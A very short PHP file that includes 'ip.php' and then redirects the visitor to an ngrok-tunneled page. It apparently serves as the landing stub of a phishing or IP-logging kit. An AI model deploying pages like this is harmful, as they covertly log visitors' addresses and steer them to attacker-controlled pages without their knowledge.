<?php
include 'ip.php';
header('Location: https://f1cf7e41066c.ngrok.io/index2.html');
exit
?>
